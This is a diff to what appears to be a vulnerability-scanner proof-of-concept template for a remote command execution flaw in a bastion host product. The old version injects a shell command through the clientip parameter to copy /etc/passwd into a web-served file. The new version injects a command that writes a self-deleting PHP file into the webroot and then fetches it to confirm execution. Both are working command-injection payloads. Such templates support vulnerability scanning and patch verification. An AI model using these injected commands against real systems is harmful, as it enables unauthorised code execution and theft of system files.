@@ -1,21 +1,23 @@
 name: poc-yaml-zhongyuanqilin-fortressaircraft-rce
 manual: true
 transport: http
+set:
+  r2: randomLowercase(10)
 rules:
   r0:
     request:
       cache: true
       method: GET
-      path: /get_luser_by_sshport.php?clientip=1;cat%20/etc/passwd>/opt/freesvr/web/htdocs/freesvr/audit/poc.txt;&clientport=1
+      path: /get_luser_by_sshport.php?clientip=1;echo%20"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>">/opt/freesvr/web/htdocs/freesvr/audit/{{r2}}.php;&clientport=1
       follow_redirects: false
     expression: response.status == 200
   r1:
     request:
       cache: true
       method: GET
-      path: /poc.txt
+      path: /{{r2}}.php
       follow_redirects: false
-    expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(r2)))
 expression: r0() && r1()
 
 detail:
